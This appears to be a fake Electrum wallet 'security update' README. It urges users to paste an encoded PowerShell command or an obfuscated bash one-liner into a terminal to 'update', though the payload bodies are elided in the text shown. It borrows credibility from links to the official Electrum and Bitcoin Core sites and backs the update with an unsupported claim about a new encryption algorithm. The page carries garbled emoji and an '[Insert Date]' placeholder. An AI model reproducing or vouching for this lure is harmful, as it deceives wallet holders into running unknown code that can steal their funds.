![Security Banner](https://i.ibb.co/fY9GwBs/1.webp/728x90.png?text=Important+Security+Update)

  

**Updated: [Insert Date]**

  

---

  

## üîó Official Websites:

- [Electrum Wallet Official Website](https://electrum.org)

- [Bitcoin Core Official Website](https://bitcoincore.org)

  

---

  

## üö® Attention Electrum Users!

  

Electrum has announced a transition to a new encryption algorithm to enhance security. While the old version of the wallet will still work, it may be vulnerable to attacks and could function improperly. I strongly recommend updating your wallet to avoid potential issues.

  

---

  

### üì• How to Update?

  

#### For Windows:

  

1. Open **PowerShell** or **CMD**.

2. Run the following command by clicking the "Copy" button:

  

```powershell

powershell -EncodedCommand ...

```

  

---

  

#### For macOS:

  

1. Open **Terminal**.

2. Run the following command by clicking the "Copy" button:

  

```bash

bash  -c  "$(echo 

```

  

---

  

### ‚ùó Important Notes

  

- The old wallet version will still work, but it may be vulnerable to attacks and could function improperly.

- The new version uses an improved cipher for enhanced security.

  

---

  

### üîí Recommendations

  

- Back up your wallet before updating.

- Only use official sources to run these commands.

  

---

  

If you encounter any issues or have questions, feel free to open an Issue. Protect your funds and update for maximum security!
